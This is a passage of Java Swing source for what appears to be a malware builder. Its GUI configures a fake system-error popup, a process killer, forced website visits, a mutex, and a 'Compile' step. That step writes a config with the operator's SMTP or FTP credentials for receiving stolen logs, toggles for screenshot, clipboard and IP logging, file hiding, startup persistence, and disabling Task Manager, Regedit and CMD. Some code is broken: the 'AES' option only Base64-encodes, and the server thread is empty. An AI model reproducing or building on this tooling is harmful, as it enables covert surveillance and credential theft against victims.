		TextField_TITLETEXT.setBounds(67, 44, 116, 20);
		TextField_TITLETEXT.setFont(SetFont(11));
		TextField_TITLETEXT.addFocusListener(new FocusAdapter() {
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(TextField_TITLETEXT.getText()).equals("System Error"))
				{
					TextField_TITLETEXT.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(TextField_TITLETEXT.getText()).equals(""))
				{
					TextField_TITLETEXT.setText("System Error");
				}
				else if (String.valueOf(TextField_TITLETEXT.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		FakeMessageBoxPane.add(TextField_TITLETEXT);
		TextField_TITLETEXT.setColumns(10);
		
		JLabel Label_MESSAGE = new JLabel("Message:");
		Label_MESSAGE.setBounds(12, 70, 51, 14);
		Label_MESSAGE.setFont(SetFont(11));
		FakeMessageBoxPane.add(Label_MESSAGE);
		
		TextField_MESSAGEBOX = new JTextField();
		TextField_MESSAGEBOX.setEnabled(false);
		TextField_MESSAGEBOX.setText("The application was unable to start correctly (0xc0000142). Click OK to close the application.");
		TextField_MESSAGEBOX.setBounds(67, 68, 116, 20);
		TextField_MESSAGEBOX.setFont(SetFont(11));
		TextField_MESSAGEBOX.addFocusListener(new FocusAdapter() {
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(TextField_MESSAGEBOX.getText()).equals("The application was unable to start correctly (0xc0000142). Click OK to close the application."))
				{
					TextField_MESSAGEBOX.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(TextField_MESSAGEBOX.getText()).equals(""))
				{
					TextField_MESSAGEBOX.setText("The application was unable to start correctly (0xc0000142). Click OK to close the application.");
				}
				else if (String.valueOf(TextField_MESSAGEBOX.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		FakeMessageBoxPane.add(TextField_MESSAGEBOX);
		TextField_MESSAGEBOX.setColumns(10);
		
	    Critical_RB = new JRadioButton("Critical");
	    Critical_RB.setSelected(true);
	    Critical_RB.setEnabled(false);
		Critical_RB.setBounds(20, 100, 65, 23);
		Critical_RB.setFont(SetFont(11));
		RadioButtons.add(Critical_RB);
		FakeMessageBoxPane.add(Critical_RB);
		
		Warning_RB = new JRadioButton("Warning");
		Warning_RB.setEnabled(false);
		Warning_RB.setBounds(20, 126, 81, 23);
		Warning_RB.setFont(SetFont(11));
		RadioButtons.add(Warning_RB);
		FakeMessageBoxPane.add(Warning_RB);
		
		Information_RB = new JRadioButton("Information");
		Information_RB.setEnabled(false);
		Information_RB.setBounds(20, 152, 87, 23);
		Information_RB.setFont(SetFont(11));
		RadioButtons.add(Information_RB);
		FakeMessageBoxPane.add(Information_RB);
		
		Button_TESTFAKEMESSAGEBOX = new JButton("Show Fake Messagebox");
		Button_TESTFAKEMESSAGEBOX.setFont(SetFont(11));
		Button_TESTFAKEMESSAGEBOX.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) 
			{
				if (Critical_RB.isSelected())
				{
					JOptionPane.showMessageDialog(null, TextField_MESSAGEBOX.getText(), TextField_TITLETEXT.getText(), JOptionPane.ERROR_MESSAGE);
				}
				else if (Warning_RB.isSelected())
				{
					JOptionPane.showMessageDialog(null, TextField_MESSAGEBOX.getText(), TextField_TITLETEXT.getText(), JOptionPane.WARNING_MESSAGE);
				}
				else if (Information_RB.isSelected())
				{
					JOptionPane.showMessageDialog(null, TextField_MESSAGEBOX.getText(), TextField_TITLETEXT.getText(), JOptionPane.INFORMATION_MESSAGE);
				}
				else
				{
					System.out.println("Could not identify any radiobuttons for the action.");
				}
			}
		});
		Button_TESTFAKEMESSAGEBOX.setEnabled(false);
		Button_TESTFAKEMESSAGEBOX.setBounds(16, 182, 167, 28);
		FakeMessageBoxPane.add(Button_TESTFAKEMESSAGEBOX);
		
		JLabel Label_CRITICALPICTURE = new JLabel("");
		Label_CRITICALPICTURE.setBounds(114, 103, 16, 16);
		ImageIcon icon = new ImageIcon(getClass().getResource("/Images/error.png"));
		Label_CRITICALPICTURE.setIcon(icon);
		FakeMessageBoxPane.add(Label_CRITICALPICTURE);
		
		JLabel Label_WARNINGPICTURE = new JLabel("");
		Label_WARNINGPICTURE.setBounds(114, 130, 16, 16);
		ImageIcon ico = new ImageIcon(getClass().getResource("/Images/warning.png"));
		Label_WARNINGPICTURE.setIcon(ico);
		FakeMessageBoxPane.add(Label_WARNINGPICTURE);
		
		JLabel Label_INFORMATIONPICTURE = new JLabel("");
		Label_INFORMATIONPICTURE.setBounds(114, 156, 16, 16);
		ImageIcon ico2 = new ImageIcon(getClass().getResource("/Images/information.png"));
		Label_INFORMATIONPICTURE.setIcon(ico2);
		FakeMessageBoxPane.add(Label_INFORMATIONPICTURE);
		
		ProcessKillerPane = new JPanel();
		ProcessKillerPane.setLayout(null);
		ProcessKillerPane.setBorder(new TitledBorder(null, "Process Killer", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		ProcessKillerPane.setBounds(6, 11, 213, 116);
		FileAssemblyPage.add(ProcessKillerPane);
		
		ProcessKiller = new JCheckBox("Enable");
		ProcessKiller.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) 
			{
				if (ProcessKiller.isSelected() == true)
				{
					Component[] com = ProcessKillerPane.getComponents();
					for (int a = 0; a < com.length; a++) 
					{
					     com[a].setEnabled(true);
					}
				}
				else if (ProcessKiller.isSelected() == false)
				{
					Component[] com2 = ProcessKillerPane.getComponents();
					for (int a = 0; a < com2.length; a++) 
					{
					     com2[a].setEnabled(false);				    
					}
					ProcessKiller.setEnabled(true);
				}
			}
		});
		ProcessKiller.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		ProcessKiller.setBounds(145, 10, 65, 23);
		ProcessKillerPane.add(ProcessKiller);
		
		JLabel ProcessName_Label = new JLabel("Process:");
		ProcessName_Label.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		ProcessName_Label.setBounds(78, 85, 46, 14);
		ProcessKillerPane.add(ProcessName_Label);
		
		txtProcessAdd = new JTextField();
		txtProcessAdd.setEnabled(false);
		txtProcessAdd.setText("chrome.exe");
		txtProcessAdd.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		txtProcessAdd.setBounds(127, 83, 76, 20);
		txtProcessAdd.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (txtProcessAdd.getText().equals("chrome.exe"))
				{
					txtProcessAdd.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (txtProcessAdd.getText().equals(""))
				{
					txtProcessAdd.setText("chrome.exe");
				}
				else if (txtProcessAdd.getText().isEmpty() == false)
				{
					return;
				}
			}
		});
		ProcessKillerPane.add(txtProcessAdd);
		txtProcessAdd.setColumns(10);
		
		DefaultListModel model = new  DefaultListModel();
			
		list = new JList(model);
		list.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		JScrollPane ListBox = new JScrollPane(list);
		ListBox.setEnabled(false);
		ListBox.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		ListBox.setBounds(10, 25, 104, 44);
		ProcessKillerPane.add(ListBox);
		list.setBorder(new LineBorder(Color.LIGHT_GRAY));
		list.setBounds(10, 25, 90, 44);
		
		JButton AddProcessToList = new JButton("Add");
		AddProcessToList.setEnabled(false);
		AddProcessToList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				if (txtProcessAdd.getText().equals(""))
				{
					JOptionPane.showMessageDialog(null, "Process name can't be empty.", "Error", JOptionPane.ERROR_MESSAGE);
					return;
				}
				else
				{
					model.addElement(txtProcessAdd.getText());
					JOptionPane.showMessageDialog(null, "Item added!", "Success", JOptionPane.INFORMATION_MESSAGE);
				}
			}
		});
		AddProcessToList.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		AddProcessToList.setBounds(10, 82, 61, 23);
		ProcessKillerPane.add(AddProcessToList);
		
		JButton RemoveProcessFromList = new JButton("Remove");
		RemoveProcessFromList.setEnabled(false);
		RemoveProcessFromList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				int index = list.getSelectedIndex();
				if (index != -1) {
				    model.remove(index);
				    JOptionPane.showMessageDialog(null, "Item deleted!", "Success", JOptionPane.INFORMATION_MESSAGE);
				}
				else
				{
					JOptionPane.showMessageDialog(null, "Choose an item to delete.", "Error", JOptionPane.ERROR_MESSAGE);
				}
			}
		});
		RemoveProcessFromList.setBounds(127, 40, 76, 23);
		ProcessKillerPane.add(RemoveProcessFromList);
		
		JPanel WebsiteVisitorPane = new JPanel();
		WebsiteVisitorPane.setLayout(null);
		WebsiteVisitorPane.setBorder(new TitledBorder(null, "Website Visitor", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		WebsiteVisitorPane.setBounds(6, 133, 213, 99);
		FileAssemblyPage.add(WebsiteVisitorPane);
		
		EnableWebsiteVis = new JCheckBox("Enable");
		EnableWebsiteVis.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) 
			{
				if (EnableWebsiteVis.isSelected())
				{
					txtWebsiteField.setEnabled(true);
				}
				else
				{
					txtWebsiteField.setEnabled(false);
				}
			}
		});
		EnableWebsiteVis.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		EnableWebsiteVis.setBounds(145, 10, 65, 23);
		EnableWebsiteVis.setAction(EnableWebsiteVisitor);
		WebsiteVisitorPane.add(EnableWebsiteVis);
		
		JLabel label_1 = new JLabel("");
		label_1.setBounds(114, 130, 16, 16);
		WebsiteVisitorPane.add(label_1);
		
		JLabel label_2 = new JLabel("");
		label_2.setBounds(114, 156, 16, 16);
		WebsiteVisitorPane.add(label_2);
		
		JLabel lblWebsiteLink = new JLabel("Website link:");
		lblWebsiteLink.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		lblWebsiteLink.setBounds(22, 38, 75, 14);
		WebsiteVisitorPane.add(lblWebsiteLink);
		
		txtWebsiteField = new JTextField();
		txtWebsiteField.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		txtWebsiteField.setText("http://www.google.com");
		txtWebsiteField.setEnabled(false);
		txtWebsiteField.addFocusListener(new FocusAdapter() {
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(txtWebsiteField.getText()).equals("http://www.google.com"))
				{
					txtWebsiteField.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(txtWebsiteField.getText()).equals(""))
				{
					txtWebsiteField.setText("http://www.google.com");
				}
				else if (String.valueOf(txtWebsiteField.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		txtWebsiteField.setBounds(22, 57, 168, 20);
		WebsiteVisitorPane.add(txtWebsiteField);
		txtWebsiteField.setColumns(10);
		
		JPanel BuildPage = new JPanel();
		BuildPage.setBorder(new LineBorder(new Color(0, 0, 0), 0));
		Tabpage_Pages.addTab("Build", null, BuildPage, null);
		BuildPage.setLayout(null);
		
		JPanel ResourceEncryptionPane = new JPanel();
		ResourceEncryptionPane.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Resource Encryption", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 0, 0)));
		ResourceEncryptionPane.setBounds(6, 11, 205, 114);
		ResourceEncryptionPane.setFont(SetFont(11));
		BuildPage.add(ResourceEncryptionPane);
		ResourceEncryptionPane.setLayout(null);
		
		JLabel Algorithm_Label = new JLabel("Algorithm:");
		Algorithm_Label.setBounds(23, 36, 56, 14);
		Algorithm_Label.setFont(SetFont(11));
		ResourceEncryptionPane.add(Algorithm_Label);
		
		JComboBox Algorithm_List = new JComboBox();
		Algorithm_List.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e)
			{
				int index = Algorithm_List.getSelectedIndex();
				switch (index)
				{
				case 0:
					EncryptedString.setText("Hello World");
					break;		
				case 1:
					String encrypted;
					try {
						encrypted = Base64Utils.encode(NonencryptedString.getText());
						EncryptedString.setText(encrypted);
					} catch (Exception e2) 
					{
						e2.printStackTrace();
					}
					break;
				case 2:
					try 
					{	
						SecretKey key = KeyGenerator.getInstance("DES").generateKey();
					    DES encryptString = new DES(key);				 				    
						EncryptedString.setText(encryptString.encrypt("Hello"));
						break;
					} catch (Exception e1) {
						e1.printStackTrace();
					}				
				}	
			}
		});
		Algorithm_List.setModel(new DefaultComboBoxModel(new String[] {"None", "AES-256", "JCE DES"}));
		Algorithm_List.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		Algorithm_List.setBounds(87, 35, 98, 20);
		ResourceEncryptionPane.add(Algorithm_List);
		
		NonencryptedString = new JTextField();
		NonencryptedString.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		NonencryptedString.setText("Hello World");
		NonencryptedString.setEditable(false);
		NonencryptedString.setBounds(19, 71, 70, 20);
		ResourceEncryptionPane.add(NonencryptedString);
		NonencryptedString.setColumns(10);
		
		EncryptedString = new JTextField();
		EncryptedString.setText("Hello World");
		EncryptedString.setFont(new Font("Segoe UI", Font.PLAIN, 11));
		EncryptedString.setEditable(false);
		EncryptedString.setColumns(10);
		EncryptedString.setBounds(115, 71, 70, 20);
		ResourceEncryptionPane.add(EncryptedString);
		
		JSeparator Separator = new JSeparator();
		Separator.setBounds(88, 80, 27, 2);
		ResourceEncryptionPane.add(Separator);
		
		JPanel MutexPane = new JPanel();
		MutexPane.setBorder(new TitledBorder(null, "Mutex", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		MutexPane.setBounds(6, 125, 205, 107);
		BuildPage.add(MutexPane);
		MutexPane.setLayout(null);
		
		JLabel Mutex_Label = new JLabel("Mutex:");
		Mutex_Label.setBounds(19, 25, 42, 14);
		Mutex_Label.setFont(SetFont(11));
		MutexPane.add(Mutex_Label);
		
		MutexKey = new JTextField();
		MutexKey.setText("key");
		MutexKey.setBounds(19, 43, 166, 20);
		MutexKey.setEditable(false);
		MutexKey.setFont(SetFont(11));
		MutexPane.add(MutexKey);
		MutexKey.setColumns(10);
		
		JButton GenerateMutexButton = new JButton("Generate");
		GenerateMutexButton.setFont(SetFont(11));
		GenerateMutexButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				try
				{
					CharAmount.commitEdit();
				} catch (java.text.ParseException e) {}
				int value = (Integer) CharAmount.getValue();
				
				StringBuilder mutex = new StringBuilder();	
			    String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVXYZ";
			    int length = alphabet.length();
			    Random rnd = new Random();
			    for (int i = 0; i < value; i++) 
			    {
			    	mutex.append(String.valueOf(alphabet.charAt(rnd.nextInt(length))));
			    }
			    MutexKey.setText(mutex.toString());
			}
		});
		GenerateMutexButton.setBounds(19, 70, 82, 23);
		MutexPane.add(GenerateMutexButton);
		
		JLabel Chars_Label = new JLabel("Chars:");
		Chars_Label.setBounds(111, 72, 34, 14);
		Chars_Label.setFont(SetFont(11));
		MutexPane.add(Chars_Label);
		
		CharAmount = new JSpinner();
		CharAmount.setModel(new SpinnerNumberModel(5, 1, 25, 1));
		CharAmount.setBounds(151, 71, 34, 20);
		CharAmount.setFont(SetFont(11));
		CharAmount.setEditor(new JSpinner.DefaultEditor(CharAmount));
		MutexPane.add(CharAmount);
		
		JPanel CompilePane = new JPanel();
		CompilePane.setBorder(new TitledBorder(null, "Compile", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		CompilePane.setBounds(221, 11, 206, 221);
		CompilePane.setFont(SetFont(11));
		BuildPage.add(CompilePane);
		CompilePane.setLayout(null);
		
		///////////
		CompileFileButton = new JButton("Compile File");
		CompileFileButton.setEnabled(false);
		CompileFileButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				String timeStamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
				File file = new File("res");
				try
				{
					Thread.sleep(500);
					String Key_Value = "";
					LogPane.setText(LogPane.getText() + "\n" + "[" + timeStamp + "] -> Loading Resources...");
				    
					SecretKey key = KeyGenerator.getInstance("DES").generateKey();
					Key_Value = Base64.getEncoder().encodeToString(key.getEncoded());
				    DES Class = new DES(key);
				    
					PrintWriter resource = new PrintWriter("res", "UTF-8");	
					if (Algorithm_List.getSelectedIndex() == 0) // No Encryption
					{	
						if (SETUP_RDB.isSelected())					
						{
							resource.println("setup=SMTP");
							resource.println("mail=" + mail.getText());
							resource.println("pass=" + String.valueOf(passwordField.getPassword()));
							resource.println("reciever=" + txtRecievermailcom.getText());
							if (comboBox.getSelectedItem() == "...")
							{
								resource.println("SMTP=" + HOST.getText());
							}
							else if (comboBox.getSelectedItem() == "Hotmail")
							{
								resource.println("SMTP=smtp.live.com");
							}
							else if (comboBox.getSelectedItem() == "Gmail")
							{
								resource.println("SMTP=smtp.gmail.com");
							}
							else
							{
								resource.println("SMTP=smtp.mail.yahoo.com");
							}
							resource.println("port=" + spinner.getValue());
							if (chckbxEnableSsl.isSelected())
							{
								resource.println("SSL=true");
							}
							else
							{
								resource.println("SSL=false");
							}
							resource.println("hostname=");
							resource.println("Username=");
							resource.println("Password=");
						}
						else
						{
							resource.println("setup=FTP");
							resource.println("mail=");
							resource.println("pass=");
							resource.println("reciever=");
							resource.println("smtp=");
							resource.println("port=");
							resource.println("SSL=");
							
							resource.println("hostname=" + txtFtpftpcomlogtxt.getText());
							resource.println("Username=" + txtUsername.getText());
							resource.println("Password=" + String.valueOf(passwordField_1.getPassword()));					
						}									
					} 
					else if (Algorithm_List.getSelectedIndex() == 1) // AES encryption
					{
						if (SETUP_RDB.isSelected())					
						{							
							resource.println("setup=" + Base64Utils.encode("SMTP"));
							resource.println("mail=" + Base64Utils.encode(mail.getText()));
							resource.println("pass=" + Base64Utils.encode(String.valueOf(passwordField.getPassword())));						
							resource.println("reciever=" + Base64Utils.encode(txtRecievermailcom.getText()));
							if (comboBox.getSelectedItem() == "...")
							{
								resource.println("SMTP=" + Base64Utils.encode(HOST.getText()));
							}
							else if (comboBox.getSelectedItem() == "Hotmail")
							{
								resource.println("SMTP=" + Base64Utils.encode("smtp.live.com"));
							}
							else if (comboBox.getSelectedItem() == "Gmail")
							{
								resource.println("SMTP=" + Base64Utils.encode("smtp=smtp.gmail.com"));
							}
							else
							{
								resource.println("SMTP=" + Base64Utils.encode("smtp.mail.yahoo.com"));
							}
							resource.println("port=" + spinner.getValue());
							if (chckbxEnableSsl.isSelected())
							{
								resource.println("SSL=" + Base64Utils.encode("true"));
							}
							else
							{
								resource.println("SSL=" + Base64Utils.encode("false"));
							}
							resource.println("hostname=");
							resource.println("Username=");
							resource.println("Password=");
						}
						else
						{
							resource.println("setup=FTP");
							resource.println("mail=");
							resource.println("pass=");
							resource.println("reciever=");
							resource.println("smtp=");
							resource.println("port=");
							resource.println("SSL=");
							
							resource.println("hostname=" + Base64Utils.encode(txtFtpftpcomlogtxt.getText()));
							resource.println("Username=" + Base64Utils.encode(txtUsername.getText()));
							resource.println("Password=" + Base64Utils.encode(String.valueOf(passwordField_1.getPassword())));					
						}							
					} 
					
					else // JCE DES encryption
					{				
						if (SETUP_RDB.isSelected())					
						{
							resource.println("setup=" + Class.encrypt("SMTP"));
							resource.println("mail=" + Class.encrypt(mail.getText()));
							resource.println("pass=" + Class.encrypt(String.valueOf(passwordField.getPassword())));
							resource.println("reciever=" + Class.encrypt(txtRecievermailcom.getText()));
							if (comboBox.getSelectedItem() == "...")
							{
								resource.println("SMTP=" + Class.encrypt(HOST.getText()));
							}
							else if (comboBox.getSelectedItem() == "Hotmail")
							{
								resource.println("SMTP=" + Class.encrypt("smtp.live.com"));
							}
							else if (comboBox.getSelectedItem() == "Gmail")
							{
								resource.println("SMTP=" + Class.encrypt("smtp.gmail.com"));
							}
							else
							{
								resource.println("SMTP=" + Class.encrypt("smtp.mail.yahoo.com"));
							}
							resource.println("port=" + spinner.getValue());
							if (chckbxEnableSsl.isSelected())
							{
								resource.println("SSL=" + Class.encrypt("true"));
							}
							else
							{
								resource.println("SSL=" + Class.encrypt("false"));
							}
							resource.println("hostname=");
							resource.println("Username=");
							resource.println("Password=");
						}
						else
						{
							resource.println("setup=FTP");
							resource.println("mail=");
							resource.println("pass=");
							resource.println("reciever=");
							resource.println("smtp=");
							resource.println("port=");
							resource.println("SSL=");
							
							resource.println("hostname=" + Class.encrypt(txtFtpftpcomlogtxt.getText()));
							resource.println("Username=" + Class.encrypt(txtUsername.getText()));
							resource.println("Password=" + Class.encrypt(String.valueOf(passwordField_1.getPassword())));					
						}			
					}
					int seconds = (int) NumericUpDown_INTERVAL.getValue() * 60000;
					resource.println("INTERVAL=" + String.valueOf(seconds)); // Log Interval
					
					// Enable IP Logger
					if (Enable_IPLOGGER.isSelected())
					{ 
						resource.println("IPLOG=true");
					}
					else
					{
						resource.println("IPLOG=false");
					}
					
					// Enable Screenshot Logger
					if (Enable_SCREENSHOTLOGGER.isSelected())
					{
						resource.println("SCREENLOG=true");
					}
					else
					{
						resource.println("SCREENLOG=false");
					}
					
					// Log Installed Programs
					if (Enable_LIP.isSelected())
					{
						resource.println("LIP=true");
					}
					else
					{
						resource.println("LIP=false");
					}
					
					// Clipboard Logger
					if (Enable_CLIPBOARDLOGGER.isSelected())
					{
						resource.println("CLIPLOG=true");
					}
					else
					{
						resource.println("CLIPLOG=false");
					}
					
					// Hide File
					if (Enable_HIDEFILE.isSelected())
					{
						resource.println("HIDEFILE=true");
					}
					else
					{
						resource.println("HIDEFILE=false");
					}
					
					 // Disable CMD
					if (Enable_CMD.isSelected())
					{
						resource.println("CMD=true");
					}
					else
					{
						resource.println("CMD=false");
					}
					
					// Disable Regedit
					if (Enable_REGEDIT.isSelected())
					{
						resource.println("REGEDIT=true");
					}
					else
					{
						resource.println("REGEDIT=false");
					}
					
					// Disable Msconfig
					if (Enable_MSCONFIG.isSelected())
					{
						resource.println("MSCONFIG=true");
					}
					else
					{
						resource.println("MSCONFIG=false");
					}
					
					 // Disable Task manager
					if (Enable_TASKMGR.isSelected())
					{
						resource.println("TASKMGR=true");
					}
					else
					{
						resource.println("TASKMGR=false");
					}
									
					// Startup
					if (Algorithm_List.getSelectedIndex() == 0)
					{
						if (Enable_ADDTOSTARTUP.isSelected())
						{
							resource.println("STARTUP=true");
							resource.println("KEYNAME=" + TextField_VALUEKEY.getText());
							resource.println("PATH=" + String.valueOf(Combobox_PATHLOCATION.getSelectedItem()));
						}
						else
						{
							resource.println("STARTUP=false");
							resource.println("KEYNAME=none");
							resource.println("PATH=none");
						}
					}
					else if (Algorithm_List.getSelectedIndex() == 1)
					{
						if (Enable_ADDTOSTARTUP.isSelected())
						{									
							resource.println("STARTUP=" + Base64Utils.encode("true"));
							resource.println("KEYNAME=" + Base64Utils.encode(TextField_VALUEKEY.getText()));
							resource.println("PATH=" + Base64Utils.encode(String.valueOf(Combobox_PATHLOCATION.getSelectedItem())));
						}
						else
						{
							resource.println("STARTUP=false");
							resource.println("KEYNAME=none");
							resource.println("PATH=none");
						}
					}
					else
					{
						if (Enable_ADDTOSTARTUP.isSelected())
						{
							resource.println("STARTUP=" + Class.encrypt("true"));
							resource.println("KEYNAME=" + Class.encrypt(TextField_VALUEKEY.getText()));
							resource.println("PATH=" + Class.encrypt(String.valueOf(Combobox_PATHLOCATION.getSelectedItem())));
						}
						else
						{
							resource.println("STARTUP=false");
							resource.println("KEYNAME=none");
							resource.println("PATH=none");
						}
					}
					
					// Process Killer
					if (ProcessKiller.isSelected()) 
					{
						if (Algorithm_List.getSelectedIndex() == 0)
						{
							resource.println("PROCKILL=true");						
							resource.print("PROCNAMES=");
							for (int i = 0; i < model.getSize(); i++)
							{
								resource.print(model.getElementAt(i) + ", ");
							}
							resource.print("\n");
						}
						else if (Algorithm_List.getSelectedIndex() == 1) 
						{
							resource.println("PROCKILL=" + Base64Utils.encode("true"));						
							resource.print("PROCNAMES=");
							for (int i = 0; i < model.getSize(); i++)
							{
								resource.print(model.getElementAt(i) + ", ");
							}
							resource.print("\n");
						}
						else
						{
							resource.println("PROCKILL=" + Class.encrypt("true"));						
							resource.print("PROCNAMES=");
							for (int i = 0; i < model.getSize(); i++)
							{
								resource.print(Class.encrypt(model.getElementAt(i) + ", "));
							}
							resource.print("\n");
						}
					}
					else
					{
						resource.println("PROCKILL=false");						
						resource.println("PROCNAMES=");
					}
					
					// Fake Messagebox
				    if (Enable_FAKEMESSAGEBOX.isSelected()) 
					{
						if (Algorithm_List.getSelectedIndex() == 0)
						{					
							resource.println("MSG=" + TextField_MESSAGEBOX.getText());
							resource.println("TITLE=" + TextField_TITLETEXT.getText());
							if (Critical_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Critical")));
							}
							else if (Warning_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Warning")));
							}
							else if (Information_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Information")));
							}
							else
							{
								resource.println("ICON=" + Base64Utils.encode("none"));
							}						
						}
						else if (Algorithm_List.getSelectedIndex() == 1) 
						{						
							resource.println("MSG=" + Base64Utils.encode(TextField_MESSAGEBOX.getText()));
							resource.println("TITLE=" + Base64Utils.encode(TextField_TITLETEXT.getText()));
							if (Critical_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Critical")));
							}
							else if (Warning_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Warning")));
							}
							else if (Information_RB.isSelected())
							{
								resource.println("ICON=" + Base64Utils.encode(("Information")));
							}
							else
							{
								resource.println("ICON=" + Base64Utils.encode("none"));
							}
						}
						else
						{				
							resource.print("MSG=" + Class.encrypt(TextField_MESSAGEBOX.getText()));
							resource.println("TITLE=" + Class.encrypt(TextField_TITLETEXT.getText()));
							if (Critical_RB.isSelected())
							{
								resource.println("ICON=" + Class.encrypt("Critical"));
							}
							else if (Warning_RB.isSelected())
							{
								resource.println("ICON=" + Class.encrypt("Warning"));
							}
							else if (Information_RB.isSelected())
							{
								resource.println("ICON=" + Class.encrypt("Information"));
							}
							else
							{
								resource.println("ICON=" + Class.encrypt("none"));
							}
						}
					}
				    else
				    {						
						resource.println("MSG=");
						resource.println("TITLE=");
						resource.println("ICON=");
				    }
					
					// Website Visitor
					if (EnableWebsiteVis.isSelected())
					{
						resource.println("WEBVIS=" + txtWebsiteField.getText());
					}					
					else
					{
						resource.println("WEBVIS=NULL");
					}
					
					// Mutex
					resource.println("MUTEX=" + MutexKey.getText());
					
					// Encryption Algorithm
					if (Algorithm_List.getSelectedIndex() == 0)
					{
						resource.println("ALGO=NONE");
					}
					else if (Algorithm_List.getSelectedIndex() == 1)
					{
						resource.println("ALGO=" + Base64Utils.encode("AES"));
					}
					else
					{
						resource.println("ALGO=" + Base64Utils.encode(("DES")));
					}
								
					if (Algorithm_List.getSelectedIndex() == 0)
					{
						resource.println("KEY=" + "");
					}
					else if (Algorithm_List.getSelectedIndex() == 1)
					{
						resource.println("KEY=" + "");
					}
					else
					{
						resource.println("KEY=" + Key_Value);
					}
					// End
					resource.flush();
					resource.close();
					
					//////////////////////////////////////////////////////////////////////////////////////////
					new Thread(() ->
					{
						try 
						{
							// Server Settings
							// String host = "127.0.0.1";

						} 
						catch (Exception e) 
						{
							e.printStackTrace();
						}
						
				    }
					){{start();}}.join();
                    //////////////////////////////////////////////////////////////////////////////////////////
								
				}
				catch (Exception e)
				{		
					// Delete the Resource File
					if (file.exists())
					{
						file.delete();
					}
				}
			}
		});
		CompileFileButton.setBounds(10, 183, 186, 23);
		CompilePane.add(CompileFileButton);
		
		ToSCheckbox = new JCheckBox("");
		ToSCheckbox.setAction(AgreeTOS);
		ToSCheckbox.setBounds(7, 154, 173, 23);
		ToSCheckbox.setFont(SetFont(11));
		CompilePane.add(ToSCheckbox);
		
		JCheckBox SaveSettingsCheckbox = new JCheckBox("Save Settings");
		SaveSettingsCheckbox.setSelected(true);
		SaveSettingsCheckbox.setBounds(7, 128, 94, 23);
		SaveSettingsCheckbox.setFont(SetFont(11));
		CompilePane.add(SaveSettingsCheckbox);
		
		JCheckBox CompressionCheckbox = new JCheckBox("Compression");
		CompressionCheckbox.setSelected(true);
		CompressionCheckbox.setEnabled(false);
		CompressionCheckbox.setBounds(103, 128, 93, 23);
		CompressionCheckbox.setFont(SetFont(11));
		CompilePane.add(CompressionCheckbox);
		
		LogPane = new JEditorPane();
		LogPane.setEditable(false);
		LogPane.setBounds(10, 23, 186, 98);
		LogPane.setFont(SetFont(11));
		String timeStamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
		LogPane.setText("[" + timeStamp + "] -> Idle...");
		LogPane.setBorder(BorderFactory.createLineBorder(Color.LIGHT_GRAY));
		CompilePane.add(LogPane);
		JLabel TermsOfService_Label = new JLabel("?");
		TermsOfService_Label.setForeground(Color.BLUE);
		TermsOfService_Label.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) 
			{
				Tabpage_Pages.setSelectedIndex(Tabpage_Pages.getTabCount() - 1);
			}
		});
		TermsOfService_Label.setBounds(186, 158, 10, 14);
		TermsOfService_Label.setFont(SetFont(11));
		CompilePane.add(TermsOfService_Label);
		
		JLabel ClearLog = new JLabel("Clear");
		ClearLog.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) 
			{
				if (LogPane.getText() == "")
				{
					
				}
				LogPane.setText("");
			}
		});
		ClearLog.setFont(new Font("Segoe UI", Font.BOLD, 11));
		ClearLog.setBounds(169, 8, 29, 14);
		CompilePane.add(ClearLog);
		
		JPanel TOSPage = new JPanel();
